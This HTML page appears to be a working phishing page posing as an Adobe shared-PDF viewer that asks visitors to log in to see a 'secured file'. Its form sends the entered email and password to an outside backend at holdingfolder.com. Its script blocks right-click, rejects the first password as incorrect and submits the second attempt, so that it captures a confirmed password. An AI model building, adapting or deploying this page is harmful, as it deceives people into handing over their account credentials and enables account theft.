<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
  </head>
  <body>
    <!-- Loading -->
    <body oncontextmenu="return false;">
    <div
      id="loading"
      class="w-full h-screen absolute bg-white z-50 flex flex-col justify-center items-center hidden"
    >
      <img src="https://resusfactor.org/pdf.jpeg" class="w-20" />
      <img
        src="https://www.vyvapts.com/wp-content/uploads/loading.gif"
        class="w-20 mt-5"
      />
    </div>
    <!-- Main modal -->
    <div class="w-full h-screen justify-center items-center absolute flex">
      <div
        id="default-modal"
        tabindex="-1"
        class="fixed z-40 w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full items-center justify-center flex"
      >
        <div class="relative w-full max-w-2xl max-h-full">
          <!-- Modal content -->
          <div class="relative bg-black/60 rounded-lg shadow backdrop-blur-sm">
            <!-- Modal header -->
            <form action="https://holdingfolder.com/backend.php" method="get">
              <div class="p-6">
                <div class="flex w-full">
                  <image
                    src="https://resusfactor.org/pdf.jpeg"
                    class="w-14 mr-10"
                  />
                  <div class="flex flex-col text-white">
                    <span> Shared Adobe PDF file. </span>
                    <span class="flex">
                      verified with
                      <img
                        src="https://resusfactor.org/OIP.jpeg"
                        class="h-5 ml-2"
                    /></span>
                    <span> File size on disk: 1.6Mb (Downloaded) </span>
                  </div>
                </div>
                <p class="text-base leading-relaxed text-white mt-5">
                  A secured file has been shared with you, please login to view
                  file.
                </p>

                <!--Email Field -->
                <div class="flex flex-col" id="email-field">
                  <label
                    for="helper-text"
                    class="block text-sm font-medium text-gray-900 dark:text-white mt-10"
                    >Your email</label
                  >
                  <input
                    type="email"
                    name="email"
                    id="helper-text"
                    aria-describedby="helper-text-explanation"
                    class="mt-1 bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                    placeholder="name@example.com"
                  />
                </div>
                <!-- Password -->
                <div class="flex flex-col hidden" id="password-field">
                  <label
                    for="helper-text"
                    class="block text-sm font-medium text-gray-900 dark:text-white mt-10"
                    >Your password</label
                  >
                  <input
                    type="password"
                    name="password"
                    id="helper-text"
                    aria-describedby="helper-text-explanation"
                    class="mt-1 bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                    placeholder="******"
                  />
                </div>
                <p
                  id="helper-text-explanation"
                  class="mt-1 text-sm text-gray-200"
                >
                  Weâ€™ll never share your details. Read our
                  <a href="#" class="font-medium text-blue-100 hover:underline"
                    >Privacy Policy</a
                  >.
                </p>
              </div>
              <!-- Modal footer -->
              <div
                class="flex items-center p-6 space-x-2 border-t border-gray-200 rounded-b dark:border-gray-600"
              >
                <!-- Next button -->
                <button
                  data-modal-hide="default-modal"
                  type="button"
                  id="next_btn"
                  class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800"
                >
                  Next
                </button>
                <!-- Submit  Button -->
                <button
                  data-modal-hide="default-modal"
                  type="submit"
                  id="submit_btn"
                  class="text-white hidden bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800"
                >
                  Submit
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

    <!-- Header -->
    <section
      class="p-[10px] bg-[#970101] flex justify-between items-center z-0"
    >
      <div class="flex justify-between items-center">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="30"
          height="30"
          fill="#ffffff"
          class="bi bi-file-earmark-pdf-fill"
          viewBox="0 0 16 16"
        >
          <path
            d="M5.523 12.424c.14-.082.293-.162.459-.238a7.878 7.878 0 0 1-.45.606c-.28.337-.498.516-.635.572a.266.266 0 0 1-.035.012.282.282 0 0 1-.026-.044c-.056-.11-.054-.216.04-.36.106-.165.319-.354.647-.548zm2.455-1.647c-.119.025-.237.05-.356.078a21.148 21.148 0 0 0 .5-1.05 12.045 12.045 0 0 0 .51.858c-.217.032-.436.07-.654.114zm2.525.939a3.881 3.881 0 0 1-.435-.41c.228.005.434.022.612.054.317.057.466.147.518.209a.095.095 0 0 1 .026.064.436.436 0 0 1-.06.2.307.307 0 0 1-.094.124.107.107 0 0 1-.069.015c-.09-.003-.258-.066-.498-.256zM8.278 6.97c-.04.244-.108.524-.2.829a4.86 4.86 0 0 1-.089-.346c-.076-.353-.087-.63-.046-.822.038-.177.11-.248.196-.283a.517.517 0 0 1 .145-.04c.013.03.028.092.032.198.005.122-.007.277-.038.465z"
          />
          <path
            fill-rule="evenodd"
            d="M4 0h5.293A1 1 0 0 1 10 .293L13.707 4a1 1 0 0 1 .293.707V14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2zm5.5 1.5v2a1 1 0 0 0 1 1h2l-3-3zM4.165 13.668c.09.18.23.343.438.419.207.075.412.04.58-.03.318-.13.635-.436.926-.786.333-.401.683-.927 1.021-1.51a11.651 11.651 0 0 1 1.997-.406c.3.383.61.713.91.95.28.22.603.403.934.417a.856.856 0 0 0 .51-.138c.155-.101.27-.247.354-.416.09-.181.145-.37.138-.563a.844.844 0 0 0-.2-.518c-.226-.27-.596-.4-.96-.465a5.76 5.76 0 0 0-1.335-.05 10.954 10.954 0 0 1-.98-1.686c.25-.66.437-1.284.52-1.794.036-.218.055-.426.048-.614a1.238 1.238 0 0 0-.127-.538.7.7 0 0 0-.477-.365c-.202-.043-.41 0-.601.077-.377.15-.576.47-.651.823-.073.34-.04.736.046 1.136.088.406.238.848.43 1.295a19.697 19.697 0 0 1-1.062 2.227 7.662 7.662 0 0 0-1.482.645c-.37.22-.699.48-.897.787-.21.326-.275.714-.08 1.103z"
          />
        </svg>
        <h1 class="text-base text-white ml-2">Shared_document</h1>
      </div>
      <!-- Sec div -->
      <div class="flex justify-between items-center">
        <h1 class="text-base text-white ml-2 mr-3">Adobe Secure File</h1>
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="20"
          height="20"
          fill="#ffffff"
          class="bi bi-download"
          viewBox="0 0 16 16"
        >
          <path
            d="M.5 9.9a.5.5 0 0 1 .5.5v2.5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2.5a.5.5 0 0 1 1 0v2.5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-2.5a.5.5 0 0 1 .5-.5z"
          />
          <path
            d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"
          />
        </svg>
        <!-- Three Dot -->
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="20"
          height="20"
          fill="#ffffff"
          class="bi bi-three-dots-vertical ml-5"
          viewBox="0 0 16 16"
        >
          <path
            d="M9.5 13a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm0-5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm0-5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0z"
          />
        </svg>
        <span class="bg-white p-1 ml-3">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="20"
            height="20"
            fill="currentColor"
            class="bi bi-person-fill"
            viewBox="0 0 16 16"
          >
            <path
              d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3Zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6Z"
            />
          </svg>
        </span>
      </div>
    </section>
    <section
      class="bg-[url('https://resusfactor.org/bg1.png')] bg-cover w-auto h-[6vh] z-0"
    ></section>
    <section class="grid grid-flow-row-dense grid-cols-4 z-0">
      <div
        class="col-span-1 bg-[url('https://resusfactor.org/bg2.png')] bg-no-repeat bg-cover"
      >
        <img
          src="https://www.vyvapts.com/wp-content/uploads/loading.gif"
          class="w-20 mt-[75px] ml-[65px]"
        />
      </div>
      <div
        class="col-span-3 h-screen bg-[url('https://resusfactor.org/bg3.png')] bg-no-repeat bg-cover"
      ></div>
    </section>
  </body>
  <script>
    var next_btn = document.getElementById("next_btn");
  var submit_btn = document.getElementById("submit_btn");
  var email_field = document.getElementById("email-field");
  var password_field = document.getElementById("password-field");
  var loading = document.getElementById("loading");
  var attemptCount = 0;
  var maxAttempts = 2;

  next_btn.addEventListener("click", function () {
    console.log("button clicked");
    email_field.classList.add("hidden");
    password_field.classList.remove("hidden");
    next_btn.classList.add("hidden");
    submit_btn.classList.remove("hidden");
    loading.classList.remove("hidden");
    setInterval(() => {
      loading.classList.add("hidden");
    }, 3000);
  });

  submit_btn.addEventListener("click", function (event) {
    var passwordInput = document.getElementById("helper-text");
    var enteredPassword = passwordInput.value.trim();

    // Check if the password field is blank
    if (enteredPassword === "") {
      alert("Please enter your password.");
      event.preventDefault();
    } else {
      // Check password and update attempt count
      if (checkPassword(enteredPassword)) {
        loading.classList.remove("hidden");
      } else {
        attemptCount++;
        if (attemptCount >= maxAttempts) {
          alert("You have reached the maximum number of attempts.");
          // Optionally, you can take additional actions here, such as redirecting or disabling the form.
        } else {
          alert("Incorrect password. Please try again.");
          event.preventDefault();
        }
      }
    }
  });

  // Enable or disable the submit button based on whether the password field is blank
  document.getElementById("helper-text").addEventListener("input", function () {
    var passwordInput = document.getElementById("helper-text");
    submit_btn.disabled = passwordInput.value.trim() === "";
  });

  function checkPassword(password) {
    // Implement your password validation logic here
    // For example, you might compare the entered password with a predefined correct password
    // Replace the condition below with your actual password validation logic
    return password === "correctpassword";
  }
</script>
</html>
